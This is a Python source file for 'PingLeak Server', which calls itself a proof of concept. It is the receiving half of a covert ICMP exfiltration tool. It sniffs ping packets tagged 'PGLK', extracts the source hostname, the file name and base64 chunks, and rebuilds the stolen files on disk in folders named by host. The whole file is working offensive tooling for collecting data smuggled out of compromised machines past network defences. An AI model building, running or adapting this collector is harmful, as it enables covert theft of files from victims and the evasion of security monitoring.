'''
    ///-\\\
    |^   ^|    PingLeak Server
    |O   O|
    |  ~  |    So much room for improvement but it does the job as a PoC
     \ O /
      | |
'''
import base64
import hashlib
import os
import re
from scapy.all import sniff, ICMP, Raw

g_payload   = {}
g_filename  = None
g_hostname  = None
g_hash      = None


def f_getpayload(pkt):
    global g_filename, g_hostname, g_hash

    if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
        payload                 = pkt[Raw].load
        if payload.startswith(b"PGLK"):
            seq                 = int.from_bytes(payload[4:6], 'big')
            lastpacket          = payload[6] == 1
            if seq == 0:
                hostnamelen     = payload[7]
                g_hostname      = payload[8:8+hostnamelen].decode(errors='ignore')
                filenamelen     = payload[8+hostnamelen]
                g_filename      = payload[9+hostnamelen:9+filenamelen+hostnamelen].decode(errors='ignore')
                data            = payload[9+filenamelen+hostnamelen:]
                print(f'[{g_hostname}][{g_filename}]', end="", flush=True)
            else:
                data            = payload[7:]
            g_payload[seq]      = data
            if lastpacket:
                f_writefile()


def f_writefile():
    global g_payload, g_hash
    
    localfile       = f_makedir()
    with open(localfile or "recovered_file", "wb") as f:
        b64         = b''.join(g_payload[i] for i in sorted(g_payload.keys()))
        f.write(base64.b64decode(b64))
    print(" Received.")
    f_initglobal()


def f_makedir():
    global g_filename, g_hostname
    
    localfilepath   = g_hostname + "/" + re.sub(r'^([a-zA-Z]):', r'\1_', g_filename)
    localfilepath   = os.path.normpath(localfilepath)
    directory       = os.path.dirname(localfilepath)
    if directory and not os.path.exists(directory):
        os.makedirs(directory, exist_ok=True)
    return localfilepath


def f_initglobal():
    global g_payload, g_filename, g_hostname, g_hash
    g_payload   = {}
    g_filename  = None
    g_hostname  = None
    g_hash      = None


if __name__ == "__main__": 
    f_initglobal()
    print("Waiting for files...")
    sniff(filter="icmp", prn=f_getpayload)
